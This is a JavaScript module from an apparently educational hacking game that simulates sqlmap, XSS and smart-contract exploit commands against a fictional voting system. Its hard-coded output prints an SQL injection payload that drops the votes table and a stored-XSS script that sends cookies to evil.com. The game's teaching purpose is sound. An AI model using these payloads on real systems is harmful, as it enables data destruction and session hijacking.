import { gameState, recordExploitRun } from '../../gameState.js';
import { updateMentorMessage } from '../../uiUpdates.js';

export function runSQLInjectionTest(output, args) {
    if (args.includes('?')) {
        output.innerHTML += `
            <div class="text-cyan-400 mb-2">
                <div class="font-bold">üíâ SQLMAP - SQL Injection Toolkit</div>
                <div class="text-sm mt-1">Usage: sqlmap [target] [options]</div>
                <div class="text-xs mt-2 space-y-1">
                    <div><span class="text-green-400">sqlmap civitas-vote.local</span> - Basic injection test</div>
                    <div><span class="text-green-400">sqlmap --dbs</span> - Enumerate databases</div>
                    <div><span class="text-green-400">sqlmap --dump</span> - Extract data (DANGEROUS)</div>
                </div>
            </div>
        `;
        return;
    }

    output.innerHTML += `
        <div class="text-cyan-400">
            <div>Testing SQL injection vulnerabilities on voting system...</div>
        </div>
    `;

    setTimeout(() => {
        output.innerHTML += `
            <div class="text-red-400 mb-2">
                <div class="font-bold text-red-300">üö® CRITICAL VULNERABILITY CONFIRMED</div>
                <div class="font-mono text-xs mt-2">
[INFO] Testing parameter 'voter_id' for SQL injection<br>
[CRITICAL] Time-based blind SQL injection found!<br>
[SUCCESS] Database: civitas_vote<br>
[SUCCESS] Tables found: voters(1,234 records), votes(5,678 records)<br><br>

<span class="text-yellow-400">Exploitable payload:</span><br>
POST /api/submit-vote<br>
voter_id: 1'; DROP TABLE votes; --<br><br>

<span class="text-red-400">‚ö†Ô∏è SEVERE RISK:</span><br>
‚Ä¢ Complete database access possible<br>
‚Ä¢ Vote records can be modified/deleted<br>
‚Ä¢ Voter information exposed<br>
‚Ä¢ ENTIRE ELECTION INTEGRITY AT RISK
                </div>
            </div>
        `;
        
        gameState.exploitsRun += 1;
        recordExploitRun('vote-processor', 'sql-injection', true);
        updateMentorMessage("CRITICAL: SQL injection confirmed in vote processing! This could compromise the entire election. Document this immediately.");
        output.scrollTop = output.scrollHeight;
    }, 3500);
}

export function runXSSTest(output, args) {
    if (args.includes('?')) {
        output.innerHTML += `
            <div class="text-cyan-400 mb-2">
                <div class="font-bold">üï∏Ô∏è XSS-TEST - Cross-Site Scripting Scanner</div>
                <div class="text-sm mt-1">Usage: xss-test [target] [options]</div>
                <div class="text-xs mt-2 space-y-1">
                    <div><span class="text-green-400">xss-test frontend.civitas.local</span> - Basic XSS scan</div>
                    <div><span class="text-green-400">xss-test --payload stored</span> - Test stored XSS</div>
                </div>
            </div>
        `;
        return;
    }

    output.innerHTML += `
        <div class="text-cyan-400">
            <div>Scanning for XSS vulnerabilities in voting interface...</div>
        </div>
    `;

    setTimeout(() => {
        output.innerHTML += `
            <div class="text-orange-400 mb-2">
                <div class="font-bold text-orange-300">‚ö†Ô∏è XSS VULNERABILITY DETECTED</div>
                <div class="font-mono text-xs mt-2">
[INFO] Testing XSS vectors in candidate display field<br>
[SUCCESS] Stored XSS confirmed in voting interface<br>
[PAYLOAD] &lt;script&gt;document.location='http://evil.com/'+document.cookie&lt;/script&gt;<br><br>

<span class="text-yellow-400">Attack vector:</span><br>
‚Ä¢ Candidate name field accepts unfiltered HTML<br>
‚Ä¢ JavaScript executes when votes are displayed<br>
‚Ä¢ Session cookies can be stolen<br><br>

<span class="text-orange-400">Impact:</span><br>
‚Ä¢ Voter session hijacking<br>
‚Ä¢ Vote preference disclosure<br>
‚Ä¢ Admin account compromise potential
                </div>
            </div>
        `;
        
        gameState.exploitsRun += 1;
        recordExploitRun('frontend-ui', 'xss', true);
        updateMentorMessage("XSS vulnerability could expose voter privacy and enable session hijacking. This compromises voter confidentiality.");
        output.scrollTop = output.scrollHeight;
    }, 3000);
}

export function runContractExploit(output, args) {
    if (args.includes('?')) {
        output.innerHTML += `
            <div class="text-cyan-400 mb-2">
                <div class="font-bold">‚õìÔ∏è CONTRACT-EXPLOIT - Smart Contract Analyzer</div>
                <div class="text-sm mt-1">Usage: contract-exploit [options]</div>
                <div class="text-xs mt-2 space-y-1">
                    <div><span class="text-green-400">contract-exploit --overflow</span> - Test integer overflow</div>
                    <div><span class="text-green-400">contract-exploit --reentrancy</span> - Test reentrancy attacks</div>
                </div>
            </div>
        `;
        return;
    }

    output.innerHTML += `
        <div class="text-cyan-400">
            <div>Analyzing smart contract for vulnerabilities...</div>
        </div>
    `;

    setTimeout(() => {
        output.innerHTML += `
            <div class="text-red-400 mb-2">
                <div class="font-bold text-red-300">üî• MULTIPLE CRITICAL CONTRACT FLAWS</div>
                <div class="font-mono text-xs mt-2">
[CRITICAL] Integer overflow vulnerability detected<br>
[CRITICAL] Reentrancy attack vector found<br>
[CRITICAL] Missing access control on resetVotes()<br><br>

<span class="text-yellow-400">Exploit scenarios:</span><br>
1. <span class="text-red-300">Integer Overflow:</span> Vote count wraps to 0<br>
2. <span class="text-red-300">Reentrancy:</span> Multiple votes from single address<br>
3. <span class="text-red-300">Access Control:</span> Anyone can reset all votes<br><br>

<span class="text-red-400">‚ö†Ô∏è CATASTROPHIC RISK:</span><br>
‚Ä¢ Vote counts can be manipulated to 0<br>
‚Ä¢ Unlimited voting by attackers<br>
‚Ä¢ Complete election results can be wiped<br>
‚Ä¢ BLOCKCHAIN IMMUTABILITY COMPROMISED
                </div>
            </div>
        `;
        
        gameState.exploitsRun += 1;
        recordExploitRun('blockchain-api', 'contract-exploit', true);
        updateMentorMessage("Smart contract has devastating flaws! These vulnerabilities could completely invalidate election results and are permanent once deployed.");
        output.scrollTop = output.scrollHeight;
    }, 3500);
}

export function runSpecificExploit(output, exploitType) {
    output.innerHTML += `
        <div class="text-yellow-400 mb-2">
            <div>Launching specific exploit: ${exploitType}</div>
            <div class="text-xs text-red-300 mt-1">‚ö†Ô∏è This is a simulated environment for educational purposes</div>
        </div>
    `;

    setTimeout(() => {
        output.innerHTML += `
            <div class="text-red-400">
                <div class="font-mono text-xs">
[EXPLOIT] ${exploitType} executed<br>
[RESULT] Vulnerability demonstration complete<br>
[STATUS] Impact documented for responsible disclosure
                </div>
            </div>
        `;
        output.scrollTop = output.scrollHeight;
    }, 2000);
}

export function showExploitHelp(output) {
    output.innerHTML += `
        <div class="text-cyan-400 mb-2">
            <div class="font-bold">üí£ EXPLOIT - Vulnerability Testing Framework</div>
            <div class="text-sm mt-1">Usage: exploit [type]</div>
            <div class="text-xs mt-2 space-y-1">
                <div><span class="text-green-400">exploit buffer-overflow</span> - Test buffer overflow conditions</div>
                <div><span class="text-green-400">exploit privilege-escalation</span> - Test privilege escalation</div>
                <div><span class="text-green-400">exploit csrf</span> - Cross-site request forgery test</div>
            </div>
        </div>
    `;
}
